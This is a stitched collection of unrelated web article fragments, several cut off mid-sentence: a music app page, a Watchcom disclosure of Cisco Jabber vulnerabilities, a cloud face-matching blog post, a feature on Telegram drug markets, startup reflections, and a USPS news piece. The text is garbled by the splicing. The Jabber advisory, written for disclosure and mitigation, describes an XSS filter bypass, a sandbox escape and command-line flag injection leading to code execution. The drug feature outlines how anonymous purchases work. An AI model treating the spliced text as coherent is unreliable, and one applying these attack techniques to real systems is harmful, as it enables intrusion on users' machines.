with some built-in mics: recording will not stop, even when you are 'silent',
and the buffer is filled mainly with noise. You may even think that
Slice//Jockey does not work at all. So, set the silence-threshold at least
above the noise floor. You may need to tune mic level in your computer's system
settings.
</p>

<img src="http://www.katjaas.nl/slicejockey/silencethreshold.gif" alt="">




<p>
Slice//Jockey3 runs on Linux, MacOS and Windows with various hardware
architectures (Intel 32/64 bit, ARM). In terms of CPU load an old skool netbook
with Atom processor used to represent the minimum hardware requirement for
Slice//Jockey. Raspberry Pi 3 and 4 are comfortable with the demands of
Slice//Jockey3 and leave enough CPU cycles to run other stuff simultaneously.
More powerful hardware like a recent laptop hardly notices the load. The main
window is tailored to fit a netbook display at least (1024*600).
</p>

<p>
Slice//Jockey was conceived in 2010 with touch screen in mind, anticipating the
expected proliferation of touch-enabled computers. In retrospect this was
over-optimistic. In 2019 laptops with touch screen are available but still a
minority. In the meantime an interesting breed of touch computers has become
affordable on the second hand market: Panasonic Toughbooks. Laptop/tablet
convertible CF-19 is my favorite, with resistive touch screen that works under
<a href="http://www.katjaas.nl/linux/touch.html">Linux</a> too.
</p>

<img src="http://www.katjaas.nl/slicejockey/toughbook.jpg" alt="">

<p>
General purpose computers with touch screen remain on the fringe, and
Slice//Jockey with them. People have sometimes asked "When comes Slice Jockey
for iPad?" This is unlikely to happen. The fun …</p></div>

One of the vulnerabilities allows Remote Code Execution (RCE) by sending specially crafted chat messages, either in group chats or directly to targeted users. No user interaction is required, and the vulnerability can be exploited even when Cisco Jabber is running in the background.</p><div data-module="editorial-page">

<p><img alt="" src="https://watchcom.no/siteassets/jabber-calc.gif" height="720" width="1280"></p>
<p><em>Figure 1: The Jabber RCE vulnerability in action.</em></p>
<p>Security consultants from Watchcom discovered the four high severity vulnerabilities while pen-testing for a client. The vulnerabilities affect all currently supported versions of the Cisco Jabber client (12.1 – 12.9). The four vulnerabilities and their corresponding CVE numbers are listed below:</p>
<ul>
<li>CVE-2020-3495: Cisco Jabber Message Handling Arbitrary Code Execution (CVSS 9.9)</li>
<li>CVE-2020-3430: Cisco Jabber Protocol Handler Command Injection (CVSS 8.0)</li>
<li>CVE-2020-3498: Cisco Jabber Information Disclosure (CVSS 6.5)</li>
<li>CVE-2020-3537: Cisco Jabber Universal Naming Convention Link Handling (CVSS 5.7)</li>
</ul>
<p>This article describes the technical details of the vulnerabilities and gives useful advice for detection and mitigation.</p>
<h3>Introduction</h3>
<p>Cisco Jabber is a video conferencing and instant messaging application. It is mainly used for internal communication, but can also be used to chat, call or conduct meetings with people outside of the organization. These days a lot of people are working from home and applications like Cisco Jabber are essential to stay connected, communicate efficiently and keep businesses running smoothly.</p>
<p>Given their newfound prevalence in organizations of all sizes, these applications are becoming an increasingly attractive target for attackers. A lot of sensitive information is shared through video calls or instant messages and the applications are used by the majority of employees, including those with privileged access to other IT-systems.</p>
<p>The security of these applications is therefore paramount, and it is important to ensure that both the applications themselves, and the infrastructure they are using, are regularly audited for security gaps.</p>
<p>During a recent penetration test for an unrelated client, security consultants Olav Sortland Thoresen and Torjus Bryne Retterstøl from Watchcom discovered four serious vulnerabilities in Cisco Jabber. The vulnerabilities range from medium to critical severity and two of the vulnerabilities can be used to gain remote code execution. The most severe vulnerability is also wormable, meaning that it can be used to automatically spread malware without any user interaction.</p>
<p>Watchcom immediately reported these vulnerabilities to Cisco and coordinated a responsible disclosure. Patches have been issued and all Cisco Jabber users are strongly encouraged to update to the latest version.</p>
<h3>Background</h3>
<p>All four vulnerabilities affect the Cisco Jabber client application and were tested on Windows. The Cisco Jabber client is based on the Chromium Embedded Framework (CEF) and uses the Extensible Messaging and Presence Protocol (XMPP) for instant messages and presence updates. These two technologies are important for understanding the vulnerabilities and their implications. A brief overview of each of them is therefore provided below.</p>
<h3>Chromium Embedded Framework (CEF)</h3>
<p>CEF is a framework that allows developers to embed Chromium-based web browsers in their applications. It is used to create desktop applications based on web technologies like HTML, CSS and JavaScript. Normally, the code running in the embedded web browser is sandboxed and cannot access files or perform system calls. While this is a good security measure, application developers often want such functionality in their application and therefore find or create ways to bypass the sandbox.</p>
<p><em><strong>This leaves applications vulnerable in scenarios where the sandbox normally would’ve provided protection.</strong></em></p>
<p>Additionally, many applications that use CEF choose to pass through command line flags to the embedded web browser. This means that many CEF applications accept <a href="https://www.chromium.org/developers/how-tos/run-chromium-with-flags" target="_blank">Chromium command line flags</a>. Some of these flags can be used to execute arbitrary commands or load arbitrary DLLs and should therefore be treated with caution.</p>
<h3>Extensible Messaging and Presence Protocol (XMPP)</h3>
<p>XMPP is an XML-based protocol for instant messaging and presence. It is based on an open standard and is widely used in both open-source and proprietary software. XMPP is an extensible protocol and several extensions that provide additional functionality to the protocol exist.</p>
<p><img alt="" src="https://watchcom.no/siteassets/figure2.png" height="209" width="1137"> <em>Figure 2: An XMPP message containing both a plaintext and an HTML version of a message.</em></p>
<p>One of these extensions is XEP-0071: XHTML-IM. This extension defines how instant messages containing HTML formatted content can be exchanged over XMPP. Since HTML content can contain malicious elements, the specification states that applications must assume that messages containing HTML are malicious and sanitize them accordingly.</p>
<p>It also states that it must be possible for users to prevent automatic loading of images. Not all applications take such precautions and we will later see how this is the root cause of two of the vulnerabilities that we discovered.</p>
<h3>Cross Site Scripting Leading to RCE Vulnerability</h3>
<p>Cisco Jabber is vulnerable to Cross Site Scripting (XSS) through XHTML-IM messages. The application does not properly sanitize incoming HTML messages and instead passes them through a flawed XSS filter.</p>
<p>The filter is based on a blacklist of known-bad tags and attributes, but it is not comprehensive. Since the application is based on CEF, its embedded web browser will execute any scripts that can pass through the filter.</p>
<p>We discovered that the filter could be bypassed using the lesser-known onanimationstart attribute. Tags that had this attribute were not caught by the filter and were directly inserted into the embedded web browser’s DOM. This attribute is used to specify a JavaScript function that will be called when an element’s CSS animation starts playing. To achieve XSS using this attribute the element must have an animation assigned to it. It was not possible to inject custom CSS animations since &lt;style&gt; tags were caught by the filter, but we discovered a built-in animation called spinner-grow by grepping through the files in the installation directory. By combining these two, it was possible to create malicious HTML tags that bypassed the filter and were executed.</p>
<p><img alt="" src="https://watchcom.no/siteassets/figure3.png" height="387" width="1003"> <em>Figure 3: An XHTML-IM message that has been intercepted and modified. A malicious &lt;img&gt; tag has been added.</em></p>
<p>Cisco Jabber uses XHTML-IM by default for all messages. A malicious message can therefore easily be created by intercepting an XMPP message sent by the application and modifying it. Attackers can do this manually on their own machine or it can be automated to create a worm that spreads automatically.</p>
<p><img alt="" src="https://watchcom.no/siteassets/figure4.png" height="783" width="1123"> <em>Figure 4: When the victim receives the message, the JavaScript code is executed. In this case the code opens an alert box as a proof of concept.</em></p>
<p>After achieving XSS, we started looking for ways to escape the CEF sandbox. A vulnerable function (named window.CallCppFunction) was identified. This function is used to invoke native C++ code and the application uses it to, among other things, open files received from other Cisco Jabber users.</p>
<p>We discovered that this function can be abused by an attacker to run arbitrary executable files on the victim’s machine. The function takes a file:// URL as its second parameter and by manipulating this parameter an attacker can execute arbitrary .exe files.</p>
<p><em><strong>Since Cisco Jabber supports file transfers, an attacker can initiate a file transfer containing a malicious .exe file and force the victim to accept it using an XSS attack. </strong></em></p>
<p>The attacker can then trigger a call to window.CallCppFunction, causing the malicious file to be executed on the victim´s machine.</p>
<p><img alt="" src="https://watchcom.no/siteassets/figure5.png" height="464" width="794"> <em>Figure 5: An XHTML-IM message containing exploit code that escapes the CEF sandbox and launches calc.exe on the victim’s machine.</em></p>
<p>This vulnerability has been assigned CVE-2020-3495 with a CVSS score of 9.9 (Critical) / CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</p>
<h3>Protocol Handler Vulnerability</h3>
<p>While researching the XSS vulnerability, we discovered another high severity vulnerability concerning the handling of URLs with custom protocols.</p>
<p>Upon installation, Cisco Jabber registers protocol handlers for a number of different protocols. These are used to tell the operating system that whenever a user clicks on a URL containing one of the custom protocols (e.g. ciscoim:test@example.com) the URL should be passed to Cisco Jabber. In this case, the protocol handlers specify that the URL should be passed as a command line flag.</p>
<p><img alt="" src="https://watchcom.no/siteassets/figure6.png" height="255" width="1032"> <em>Figure 6: One of Cisco Jabber’s protocol handlers. The protocol handler specifies that URLs should be passed to the application as a command line flag.</em></p>
<p>These protocol handlers are vulnerable to command injection because they fail to consider URLs that contain spaces. By including a space in the URL, an attacker can inject arbitrary command line flags that will be passed to the application. Since the application uses CEF and accepts Chromium command line flags, several flags that can be used to execute arbitrary commands or load arbitrary DLLs exist. An example of such a flag is --GPU-launcher. This flag specifies a command that will be executed when CEFs GPU process is started.</p>
<p>This vulnerability can be combined with the XSS vulnerability to achieve code execution without transferring any files to the victim. This makes it possible to deliver malware without writing any files to disk, thus bypassing most antivirus software.</p>
<p>The video below shows the vulnerability being exploited. The attacker sends a malicious message, containing an XSS payload that escapes the CEF sandbox and uses the protocol handler vulnerability to execute commands on the …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p id="b724">Here at <a href="https://trueface.ai/" target="_blank" rel="noopener nofollow">Trueface</a>, we are always looking for ways to help organizations automate or manage daily tasks using computer vision and AI, and to that end, we have a company policy to dedicate one day a week to research.</p><p id="2439">For my research day, I decided to employ my experience running a private/public cloud and in my current role as an AI engineer, to explore the best way we can run Trueface on the cloud. This space has rapidly evolved from the old days of BSD’s jails and Solaris’s Zones to the current new hot toy: serverless computing.</p><p id="b9ac">There are two common ways to do serverless: cloud function and cloud run, and there is very little difference between the two approaches:</p><p id="0a7f"><strong>Cloud Function:</strong> a single purpose function that can be triggered via events or HTTP calls. The most common usage is database triggers (e.g: alert hotel staff on VIP persona arrival) and storage triggers (e.g: detect objects on user photo upload). However, the functions have to take less than 9 minutes to perform its tasks, and it also starts a new instance upon 10 concurrent requests.</p><p id="3f1f"><strong>Cloud Run</strong>: is stateless containers and natively portable, there is no limitation in languages, binaries or dependencies. It is only triggered via HTTP calls (or Pubnub), and the most common usage can be any workload like data batching and ML inference. Cloud Run is also capable to run 80 concurrent requests.</p><p id="3b06">Even though I am a cloud function fan, I have to experiment with Cloud Run as it is more suitable for the task at hand. The Trueface SDK is built and available as a C++ library, and we also support Python 3 as a first-class binding. I have chosen to build the web app using C++ instead of Python because of performance and it is therefore a lower cost to run. I also have picked a little library called <a href="https://github.com/yhirose/cpp-httplib" target="_blank" rel="noopener nofollow">cpp-httplib</a> to help me.</p><p id="5c9e">My objective is: given two face images, I have to measure the probability of a match. This is a common scenario for access control or identity verification. Now to the code:</p><figure><div></div></figure><p id="cb67">The web app is very simple, it listens on port 8080 to POST requests, once I receive a request to /match, I extract the face features from both images then calculate similarity and respond with match probability as a plain/text value.</p><p id="187e">Despite room for optimizations, the code above achieves the task at hand perfectly. In order to run it on Cloud Run, it has to be containerized using Docker, then pushed to Google Container Registry (just like Docker hub, but private). This service charges for storage, network egress, and vulnerability scanning, I have disabled vulnerability scanning and in my case, the network egress is free. The last variable is storage which is $0.026 per GB per month. The Trueface SDK plus the Ubuntu minimal image count for 500 MB, which means I will pay $0.01 per GB per month. Once you push the container, you see three options to deploy the container: Google Cloud Run, GKE, and GCE.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p><span>I</span>n February 2019, Amos Dov Silver, a slight man in his mid-30s who often wears his shoulder-length hair in a bun, received a Telegram message inviting him to a wedding in Ukraine. The sender had worked with Silver for more than two years and wanted him to stand in for his father at the altar. “As you know, I don’t have a family,” he wrote. Silver agreed, and the following month, he flew from Arizona to Kyiv. Less than 48 hours later, he awoke to find five Israeli police officers standing in his hotel room.</p>



<p>Silver, an American-Israeli from a Hasidic background, started using his Facebook page as a marketplace to connect marijuana dealers with buyers in 2015, after years of loudly advocating for the drug’s legalization in Israel. This was four years after the emergence of <a href="https://www.vanityfair.com/news/2017/04/silk-road-ross-ulbricht-drugs-murder">Silk Road</a>, which quickly became the gold standard for decentralized, anonymous marketplaces operating on the darknet. Founded by the American Ross Ulbricht (whose online <em>nom de guerre </em>was<em> </em>“Dread Pirate Roberts”), Silk Road was estimated to be worth over $1 billion within two years of its founding, selling everything from pot to AK-47s. As the website grew in notoriety, Ulbricht became a model for a new generation of digital drug kingpins — and, with his arrest in 2013, a harbinger of what might await successors like Silver.&nbsp;</p>



<p>When Israel decriminalized recreational marijuana use in 2017, Silver and a team of coders and managers transferred their service to the Russian messaging platform Telegram. The app is popular with activists and journalists around the world because of its end-to-end encryption, which means that the cryptographic keys needed to decrypt a message are stored with only the sender and receiver. This makes it essentially impossible for anyone, even the app maker, to decode an intercepted message. Thanks to this built-in anonymity, buying drugs through Telegrass became as easy as ordering a pizza. Unlike traditional drug cartels, Telegrass leadership doesn’t profit from individual deals; instead, to advertise their wares, dealers pay 420 shekels ($122.25) for access to the platform. Unscrupulous sellers are kicked off and get their names posted on a “wall of shame.”</p>



<p>When Telegrass arrived in Ukraine in 2017, its operators found conditions perfectly suited to running a black-market business. A permissive legal landscape and weak rule of law — as well as the large number of visiting Israelis — made it a natural candidate for Telegrass’ expansion. Additionally, while most countries mandate some form of identity verification to purchase a SIM card and register a phone number, Ukraine — along with Israel and the United States — does not, making it impossible for law enforcement to trace Telegram accounts registered under a phone number.</p>



<p>Soon after Telegrass launched in Ukraine, thousands of competing channels emerged, with the most popular attracting tens of thousands of subscribers. The old style of drug dealing, based on face-to-face interactions between consumers and dealers, disappeared. Viacheslav Markov, dean of the Faculty of Cyber Police at the Kharkiv National University of Internal Affairs, has said that 90% of drug sales in Ukraine now occur via Telegram. Viacheslav Safonov, the deputy head of Ukraine’s Department for Combating Drug Crimes, concurs. In addition to being better for advertising, the new system is safer for dealers. When buyers knew who they had purchased drugs from, there was an inclination to “share” that information with law enforcement when pressed. Now, that’s no longer possible.</p>



<p>In prosecuting Silver, Israeli authorities claimed that “Telegrass changed the face of crime.” Less than two years after his arrest, it’s unclear whether Silver was personally responsible for transforming the drug market or if he was simply an early and influential adopter of technology that would become the status quo. Whichever is true, it’s clear that, in many parts of the world, the system that Telegrass perfected has become the dominant model for buying and selling illegal drugs.</p>

<p><strong>In Kyiv, graffiti</strong> advertising Telegram drug channels is visible on nearly every city block, with tags directing buyers to @go420, @Kushcrew, or @kyivweeds. David Plaster, who runs the Kyiv-based nonprofit Anomaly, said his organization painted over more than 15,000 tags over the last 18 months, half in the capital alone. But as soon as the graffiti is eliminated, more appears. And removing it has little impact on business. Marijuana, which is grown in outlying cities near Kyiv, accounts for an estimated 13 billion hryvnias ($500,000,000) in sales per month across Ukraine. The operations are decentralized, so employees often have no idea who they’re working with, or for. That means that even if low-level dealers get busted, suppliers and distributors remain hidden from law enforcement. “Even with a sting operation, faking a channel, you can only get the buyer; it doesn’t help with the supply chain,” Plaster explained. “You can’t crack that closed loop.”</p>

<p>Once a customer joins a drug channel on Telegram, a bot will typically respond with a menu of items available for purchase. On a typical day, offerings might include a popular strain called Gagarin, named for the Soviet cosmonaut, which is advertised as a hybrid with “aromas of mint and blueberry,” or a strain called White Russian, which is earthy and spicy with “cheese flavor.” When a customer makes a selection, an anonymous operator will send a link asking for payment via cryptocurrency or through an encrypted payment platform, which in Ukraine is usually EasyPay, a Belarusian e-payment platform that allows money transfers to be made via a phone number rather than a bank account. After the money is received, the seller will send an image that includes an address or GPS coordinates signaling where the drugs are hidden.</p>



<p>That day, March 12, law enforcement agents from Israel, the U.S., Ukraine, and Germany arrested 42 people in those countries in connection with Telegrass, the encrypted drug marketplace that Silver co-founded and ran. Directed by the Israel National Cyber Directorate, the bust marked the final stage of an international operation to take down the enterprise, which, by 2018, grossed an estimated $17 million a month in sales. Telegrass was one of the world’s biggest app-based drug markets, and, from Israel, it migrated to Germany, Ukraine, and other countries in Europe, spawning countless copycats.</p>



<p>The main downside of a fully anonymous marketplace is that it lends itself easily to fraud. Common scams include sellers accepting money before deleting a Telegram conversation or simply giving buyers phony drop-off locations. “[The channels are] often operated by men in prison who send these messages on their phones,” an anonymous buyer told <em>Rest of World</em>, adding that he would frequently have to try four or five different services before finding one that worked. Safonov, of the country’s anti-drug office, confirms that this kind of fraud makes up “one of the main types of ‘earnings’ for prisoners,” who will offer products at lower price points to target “novice consumers and those trying to save money.”</p>



<p>High levels of police mistrust have also contributed to theories that police are not only protecting the drug trade but actively participating in it. Telegram user @glodov, who advocates for marijuana legalization in Ukraine, claims that certain drug delivery channels are operated by police as avenues for extortion. He cited an instance in which a buyer went to pick up a package and encountered two officers waiting for him. “They tell you that you need to pay $100 or $200, and then they will leave you alone,” he says. “They want you to pay not to go to jail.”</p>



<p>(This kind of institutionalized corruption hearkens back to an earlier era: In the post-Soviet 1990s, the country saw a boom in criminal gangs, with police often functioning as their enforcers. While Ukrainian officials initiated a massive police overhaul in 2015 to address structural problems in the force, only 7.7% of officers lost their jobs. Most appealed their dismissals and <a href="https://www.opendemocracy.net/en/odr/where-is-ukraines-new-police-force/">were eventually reinstated</a>.</p>



<p>Safonov also acknowledges that there has been illegal collaboration between authorities and dealers, even recently. In one <a href="https://hromadske.ua/posts/kolishni-policejski-organizuvali-narkolaboratoriyu-na-kiyivshini">notable instance earlier this year</a>, former police officers were found operating a methadone and amphetamine lab in an industrial building on the outskirts of Kyiv. But, he insists, this was an exception for an otherwise by-the-book force: “Bad grass grows in every garden.”</p>

<p><strong>Regardless of who</strong> is selling, Telegram is, by design, extremely difficult to police. “With an end-to-end encrypted app, users can reasonably expect that investigators won’t be able to access their chats,” said Riana Pfefferkorn, Associate Director of Surveillance and Cybersecurity at the Stanford Center for Internet and Society. While not all Telegram data is end-to-end encrypted, the company stores data in multiple centers controlled by different jurisdictions, to ensure that no government can access its systems. According to Pfefferkorn, “Companies such as Telegram and Signal intentionally minimize the amount of user metadata they store, precisely so that there is less that can be handed over to law enforcement if investigators come knocking.” (According to Telegram, while it will not interfere with private chats, it will block public channels it deems illegal, such as those belonging to terrorists and narcotraffickers.)</p>



<p>Even on an individual level, built-in accountability features can be easily circumvented. For instance, while each Telegram account must be …</p></div></div>

September 2, 2020 | https://tieshunroquerre.com/blog/yc-learnings | <a href="https://web.archive.org/web/*/https://tieshunroquerre.com/blog/yc-learnings">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>I went through Y Combinator’s W16 batch for my company StrongIntro — we helped tech companies grow their engineering teams through employee referrals. I was 17 at the time and the youngest founder in the batch of 300+ entrepreneurs. Here's what I learned:</p> <h2>The people you respect are closer than you think</h2> <p>I devoured all of PG's essays and read founder bios in my spare time growing up. Coming from a Boston suburb, I thought it would take ages to get to Silicon Valley and meet the founders I respected, let alone work alongside them. But I was able to get a job in SF with a single cold email and zero connections. A year later I was in YC listening to the founders of Reddit and Airbnb share their stories and getting advice from PG.</p> <p>This is not the case in the rest of the world, but Silicon Valley is incredibly welcoming to newcomers. If you're willing to work hard and create value it's entirely possible to work alongside the people you most respect within a short time period. I consider that magic.</p> <h2>No one knows the right answer</h2> <p>One of the first lessons YC taught us is that the partners, who were successful entrepreneurs and operators, would give us conflicting advice and that that's normal. This felt wrong to me. In school, the experts — teachers — always knew the right answer, and yet these partners who were the most successful people I'd met couldn't give me “correct” answers that would guarantee my startup’s success.</p> <p>This dampened my amazement at the time but it was also empowering. It showed me that my ideas could be just as valid as someone who's incredibly successful.</p> <h2>You don't need experience to get started</h2> <p>Outside of my own experience of getting into YC at a young age, there are numerous other examples of founders succeeding wildly with little to no experience. The Airbnb founders didn't have experience in hospitality, and they only came up with the idea after brainstorming startup ideas because they wanted to start a company (ironically VCs usually say this is not a good way to start a company). More recently, my batchmate Boom has been making waves building supersonic passenger airplanes. The founder was a software engineer at Groupon before starting the company.</p> <h2>Experience is only loosely correlated with age</h2> <p>The average age of the founders in my batch was 30. Going into the program I was intimidated that everyone else had so much more working experience than me, but I quickly learned that we were all winging it as most were first time founders like myself. YC's group office hours were a time for founders to share what they were struggling with, and everyone, regardless of age struggled with the same general problems such customers not liking their product enough, not growing fast enough, and cofounder difficulties.</p> <h2>Silicon Valley doesn't care about your background</h2> <p>In the East Coast experience and status are highly valued. Bill Gates created class scheduling software in high school, and I wanted to replicate that. I approached our school admin about doing the same when I was 16 and was promptly shut down because I was too young and "entire companies are required to create scheduling software." I wasn't even given the chance to fail.</p> <p>In contrast, no one cared about my age in YC. Most people didn't realize I was 17, and if they learned my age they always saw it as a positive trait instead of something that would hold me back. This stark difference in mindset makes sense when you consider how many young founders have famously succeeded in Silicon Valley (Steve Jobs, Bill Gates, Mark Zuckerberg) which is a trend that still persists to this day (Scale, Brex, Luminar).</p> <h2>Failure is acceptable</h2> <p>My company ultimately didn't succeed (we realized we needed to build a services business more than a technology business and that's not what we set out to do), and that was entirely okay. Most YC companies fail and it's baked into their business model — YC partners were even willing to fund my next business. This surprised me because school trained me to avoid failure at all costs — a single bad grade could tarnish my GPA permanently. The consensus goal was to get the right grades and internships to build a good resume, without any gaps that could tarnish the record.</p> <p>Silicon Valley's willingness to embrace failure is unintuitive but entirely logical. Startups aren't like school because there's no guaranteed playbook for starting a successful company — you need good execution but also experimentation and luck. Most applicants get rejected from YC multiple times before getting in, and most founders fail multiple times before succeeding. Travis Kalanick's first company failed. His second company had a modest exit after 6 years of grinding, and his third company was Uber. The Honey founders ran startups that didn’t go anywhere for years before they started Honey. Twitch was a struggling general-purpose streaming site before they doubled down on the gaming niche. The examples are endless. Failure is a necessary ingredient to success and Silicon Valley rightly internalizes that.</p> <div> <h3>Random musings</h3> <h4>East Coast vs West Coast</h4> <p>There's a more generalizable point in that the East Coast is typically more conservative than the West Coast. This is observable when dealing with venture capitalists from both sides as well. East Coast VCs are much more conservative, which is ultimately bad because it results in less moonshots succeeding. There are exceptions as well of course (ie Thrive Capital is ambitious and will bet on moonshots).</p> </div> </div></div>]]>

<p>The Factual set out this week to round up the latest on the USPS and clarify key issues using the most credible stories about the topic from across the political spectrum. Our key takeaways:</p>
<ol>
<li>DeJoy’s reforms at the USPS are meant to shore up the long-ailing agency, but his changes have led to a <a href="https://slate.com/business/2020/08/usps-mail-slowdown-dejoy-trump-election.html" rel="noopener" target="_blank"><span>slowdown in mail delivery</span></a>. This comes at a time when mail delivery and security are top concerns for citizens about to vote in a general election and when <a href="https://www.washingtonpost.com/business/2020/08/22/chicks-cockroaches-crickets-frogs-how-mail-delays-are-affecting-live-animal-trade/" rel="noopener" target="_blank"><span>low-cost shipping</span></a> is crucial for small businesses.</li>
<li>Despite accusations of a plot by Trump to hinder the USPS before the election, and albeit suspicious timing, there’s not much hard evidence that the changes are likely to impact the delivery of mail-in ballots — or are <a href="https://reason.com/2020/08/06/america-is-going-to-vote-by-mail-were-not-ready/" rel="noopener" target="_blank"><span>intended to do so</span></a>.

<h3><strong><br>Why Are People Worried About the Mail?</strong></h3>
<div><p>Mail delivery has started to experience serious and widespread delays immediately following a series of policy changes enacted by Postmaster General Louis DeJoy in July. The impacts have been felt widely across the country. <a href="https://www.nytimes.com/2020/08/20/health/Covid-us-mail-prescription-drugs.html" rel="noopener" target="_blank"><span>Seniors</span></a> and<a href="https://connectingvets.radio.com/articles/usps-delays-veteran-prescriptions-va-working-on-solutions" rel="noopener" target="_blank"> <span>veterans</span></a> have missed out on the timely delivery of medications that routinely arrive by mail — as many as <a href="https://www.foxnews.com/us/usps-delays-endanger-14-million-people-who-wont-get-their-medication-in-time-report" rel="noopener" target="_blank"><span>14 million Americans</span></a> may not receive needed medication on time. Poultry farmers that have used the mail to deliver baby chicks since 1918 have seen chicks <a href="https://www.washingtonpost.com/business/2020/08/22/chicks-cockroaches-crickets-frogs-how-mail-delays-are-affecting-live-animal-trade/" rel="noopener" target="_blank"><span>die by the thousands</span></a> due to delays in service. <a href="https://www.washingtonexaminer.com/news/small-businesses-say-theyre-suffering-mail-delivery-delays" rel="noopener" target="_blank"><span>Small businesses</span></a> that have relied on the competitive postage rates of USPS have seen packages go late or undelivered; their business models may entirely collapse if they are forced to use private shipping methods such as UPS and FedEx.</p></div>
<p><span><img src="https://lh6.googleusercontent.com/OqZHoIvQXDtuoWRBkEACBkCYSr7YXmQUncjH599Z6p2vjb6h-hS-yJ6rdvi0Tza0QaegBgHjomfbLKp3nnE_p0KH1qNRoNZaN-WbAbrTuHiQdabUfKQMlDN-W4eRYiiQpu4rykhR" width="624" height="359"></span></p>
<div><p>The decline in processing time (orange line) is what is driving the delays in mail delivery.&nbsp;Source: USPS.&nbsp;</p></div>
<p>The impacts are geographically diverse as well. Across postal delivery regions where first-class mail tends to arrive on-time 90% of the time or more, there has been <a href="https://slate.com/business/2020/08/usps-mail-slowdown-dejoy-trump-election.html" rel="noopener" target="_blank"><span>double-digit declines</span></a> in the percentage of mail delivered on time, with sub-areas like Northern Ohio falling to just 68%. In aggregate, the national percentage of on-time delivery declined from 91% to 84%. Meanwhile, <a href="https://www.businessinsider.com/usps-california-overwhelme-food-rots-and-animals-dies-in-cuts-chaos-2020-8" rel="noopener" target="_blank"><span>reports have emerged</span></a> of mailing locations overrun with packages of rotting fruit, poultry, and other perishable products — all the product of new operational changes that seem to have reduced the USPS’s ability to deliver mail on time. DeJoy has <a href="https://slate.com/business/2020/08/usps-mail-slowdown-dejoy-trump-election.html" rel="noopener" target="_blank"><span>acknowledged the delays</span></a> and assumed at least some of the blame.&nbsp;</p>
<p>This downturn coincided with <a href="https://www.marketwatch.com/story/trump-explicitly-links-mail-in-voting-and-his-opposition-to-post-office-financial-relief-2020-08-13" rel="noopener" target="_blank"><span>remarks</span></a> from President Trump that expressed his distrust of mail-in ballots and preference for the postal service not to receive additional funding that would make it easier for more people to vote by mail: “They need that money in order to have the post office work so it can take all of these millions and millions of ballots . . . If they don’t get those two items, that means you can’t have universal mail-in voting because they’re not equipped to have it.” In the context of a heated national election just weeks away in which well over <a href="https://www.usatoday.com/story/news/2020/08/19/election-2020-biden-voters-twice-likely-vote-mail-survey-finds/3399498001/" rel="noopener" target="_blank"><span>a third of registered voters</span></a> are expected to vote by mail, the consequences of potential politically-motivated meddling with the postal service have not been not lost on civil society or Trump’s political opponents.</p>
<p>“It was after DeJoy got to work that the mail delays began, according to multiple postal service-related union leaders and trade groups interviewed by Recode.” - <a href="https://www.vox.com/recode/2020/8/7/21358946/postal-service-mail-delays-election-trump-mail-in-ballots" rel="noopener" target="_blank"><span>Vox</span></a></p>
<div><p>Driving these concerns is that DeJoy appears to be a politically-motivated appointment (common in both Republican and Democratic administrations) and a <a href="https://www.salon.com/2020/08/18/postmaster-general-louis-dejoy-donated-big-to-gop-trump--his-wife-got-ambassador-post/"><span>large donor</span></a> to the Republican Party and Trump’s campaign. The timing of Trump’s remarks with the rapid deterioration in the postal service gave rise to concern that these events were in fact connected and intentional, rather than <a href="https://www.usatoday.com/story/news/factcheck/2020/08/10/fact-check-request-ballots-early-but-mail-isnt-intentionally-slow/5538705002/"><span>coincidental and untargeted</span></a>, and could have enormous impact on an upcoming election. Coupled with the more mundane changes to an essential service for many Americans, understanding exactly what is going on with the postal service has become of vital importance.</p></div>
<h3><strong>DeJoy’s Reforms to the USPS</strong></h3>
<p>DeJoy inherited an already ailing government agency burdened by shifting patterns of demand (total mail volume <a href="https://facts.usps.com/table-facts/" rel="noopener" target="_blank"><span>has declined</span></a> by roughly 16% since 2010 ) and <a href="https://ips-dc.org/how-congress-manufactured-a-postal-crisis-and-how-to-fix-it/" rel="noopener" target="_blank"><span>unrealistic financial burdens</span></a> (USPS must pre-fund its post-retirement healthcare costs for 75 years into the future, a cost imposed on no other government agency). Covid-19 has placed further pressure on the agency. Approximately 40,000 of its 600,000 employees have been <a href="https://www.tampabay.com/news/health/2020/08/06/mail-carriers-deliver-medicine-and-mail-till-dark-thanks-to-covid-19/" rel="noopener" target="_blank"><span>placed under quarantine</span></a> since the pandemic started. A further decline in the mailing of letters has thankfully been offset by a <a href="https://www.washingtonpost.com/business/2020/06/25/postal-service-packages-coronavirus/" rel="noopener" target="_blank"><span>surge in packages</span></a>, an economic boost that looks likely to keep the USPS solvent into 2021.&nbsp;</p>
<p>Chronic loss-making has driven conservatives’ criticism of wasteful government spending and led to demands for privatization. Liberal perceptions have it that the agency serves as critical connective sinew that delivers essential services to places the private sector would leave behind. An experienced businessman, DeJoy began as postmaster general in June and set out to curb losses and reform the system.</p>
<p>Among his changes, the most notable have focused on:</p>
<ul>
<li><strong>Overtime hours and operational changes:<br></strong><span>Many of the mail delays experienced around the country are likely related to DeJoy’s rules about limiting overtime and </span><a href="https://www.washingtonexaminer.com/news/small-businesses-say-theyre-suffering-mail-delivery-delays" rel="noopener" target="_blank">additional daily trips</a><span>. For a long time, on-time mail delivery has been driven in large part by </span><a href="https://www.tampabay.com/news/health/2020/08/06/mail-carriers-deliver-medicine-and-mail-till-dark-thanks-to-covid-19/" rel="noopener" target="_blank">long-hours</a><span> and additional </span><a href="https://www.usatoday.com/story/news/factcheck/2020/08/10/fact-check-request-ballots-early-but-mail-isnt-intentionally-slow/5538705002/" rel="noopener" target="_blank">daily trips</a><span> by mail carriers when the mail for a specific route couldn’t be carried in one trip. These limitations, along with </span><a href="https://www.vice.com/en_us/article/wxq47q/usps-plans-to-slash-hours-at-many-post-offices-hoping-to-save-a-buck" rel="noopener" target="_blank">shortened post office hours</a><span>, are pretty clearly connected to mail delays across the country.</span></li>
<li><strong>Mail sorting machines: </strong>These changes sound ominous, especially in the face of a glut of election-related mail, but are not particularly out of the ordinary. Given the declining trends in mail, the USPS regularly takes such machines out of service, though this year’s declines are <a href="https://www.washingtonpost.com/business/2020/08/20/postal-service-mail-sorters-removals/" rel="noopener" target="_blank"><span>larger than normal</span></a> — equivalent to about 13% of the USPS’s total sorting capacity (USPS removed 3% in 2018 and 5% in 2019).</li>
</ul>
<ul>
